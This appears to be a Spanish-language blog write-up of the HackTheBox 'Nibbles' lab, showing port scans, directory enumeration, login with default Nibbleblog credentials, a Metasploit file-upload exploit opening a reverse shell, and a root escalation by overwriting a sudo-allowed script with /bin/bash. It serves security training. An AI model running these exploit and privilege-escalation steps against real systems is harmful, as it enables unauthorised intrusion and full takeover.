---

title: "HackTheBox - Nibbles Linux Beginner"
description: "Explotación de Nibbleblog, escalada de privilegios mediante ejecución de script con sudo."
publishDate: 2024-06-25
category: "ctf"
type: "post"
difficulty: "easy"
tags: ["hackthebox", "nibbleblog", "linux", "reverse-shell", "privesc"]
readingTime: "9 min"

---

## Información del Challenge

* **Nombre**: Nibbles
* **Plataforma**: HackTheBox
* **Dificultad**: Principiante
* **Sistema Operativo**: Linux

## Análisis técnico

* **Puertos abiertos**: 22 (SSH), 80 (HTTP)
* **Servicio Web**: Apache 2.4.18
* **Aplicación web**: Nibbleblog CMS
* **Credenciales por defecto**: admin\:nibbles
* **Vulnerabilidad**: Subida de archivo malicioso (Metasploit - nibbleblog\_file\_upload)
* **Escalada de privilegios**: Ejecución de script monitor.sh vía sudo sin contraseña

## Desarrollo de la solución

### Escaneo de puertos

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n 10.10.10.75 -oG allports
nmap -sCV -p80,22 10.10.10.75 -oG ports
```

### Fingerprinting web

```bash
whatweb http://10.10.10.75
```

### Enumeración de directorios

```bash
gobuster dir -u http://10.10.10.75 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php
```

### Descubrimiento de Nibbleblog

* Comentario HTML sugiere directorio `/nibbleblog`
* Visita a `http://10.10.10.75/nibbleblog/`
* Pie de página confirma uso de Nibbleblog

### Enumeración con feroxbuster

```bash
feroxbuster --url http://10.10.10.75/nibbleblog/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php
```

### Credenciales por defecto

* Usuario encontrado en `users.xml`: `admin`
* Contraseña por defecto conocida: `nibbles`

### Explotación con Metasploit

```bash
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.10.10.75
set TARGETURI /nibbleblog/
set USERNAME admin
set PASSWORD nibbles
set LHOST <tu_ip_local>
run
```

### Shell interactivo y enumeración

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cd /home/nibbler
cat user.txt
```

### Escalada de privilegios

```bash
sudo -l
# Permite ejecutar como root sin password: /home/nibbler/personal/stuff/monitor.sh

echo -e '#!/bin/bash\n/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
whoami  # root
cat /root/root.txt
```

## Flag

* **User**: `b56***********`
* **Root**: `766********************`

## Lecciones aprendidas

* Importancia de enumerar directorios ocultos en servicios web.
* Riesgo de usar credenciales por defecto en CMS.
* Implicaciones de permitir scripts personalizados ejecutables como root mediante sudo sin contraseña.
* La utilidad de Metasploit para explotación rápida de CMS conocidos.

## Referencias

* [https://www.exploit-db.com/exploits/38489](https://www.exploit-db.com/exploits/38489)
* [https://nibbleblog.com/](https://nibbleblog.com/)
* [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/sudo-rights](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/sudo-rights)
